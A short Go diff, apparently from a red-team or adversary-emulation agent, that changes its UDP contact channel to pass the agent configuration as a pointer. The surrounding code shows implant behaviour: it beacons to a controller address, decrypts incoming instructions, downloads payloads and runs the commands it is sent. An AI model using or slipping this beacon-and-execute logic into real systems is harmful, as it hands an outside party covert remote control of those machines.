@@ -19,19 +19,19 @@ func init() {
 	CommunicationChannels["udp"] = UDP{}
 }
 
-func (contact UDP) Communicate(agent util.AgentConfig, beacon Beacon) {
+func (contact UDP) Communicate(agent *util.AgentConfig, beacon Beacon) {
 	for {
 		conn, err := net.Dial("udp", agent.Address)
 	   	if err != nil {
 	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
-	   		udpListen(conn, beacon)
+	   		udpListen(conn, beacon, agent)
 	   	}
 	   	jitterSleep(agent.Sleep, "UDP")
 	}
 }
 
-func udpListen(conn net.Conn, beacon Beacon) {
+func udpListen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
 	//initial beacon
 	udpBufferedSend(conn, beacon)
 
@@ -39,11 +39,11 @@ func udpListen(conn net.Conn, beacon Beacon) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
 		message := strings.TrimSpace(scanner.Text())
-		go udpRespond(conn, beacon, message)
+		go udpRespond(conn, beacon, message, agent)
     }
 }
 
-func udpRespond(conn net.Conn, beacon Beacon, message string){
+func udpRespond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig){
 	var tempB Beacon
 	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
 	beacon.Links = beacon.Links[:0]
@@ -52,7 +52,7 @@ func udpRespond(conn net.Conn, beacon Beacon, message string){
 		if len(link.Payload) > 0 {
 			payloadPath = requestPayload(link.Payload)
 		}
-		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath)
+		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
 		link.Response = strings.TrimSpace(response) + "\r\n"
 		link.Status = status
 		link.Pid = pid
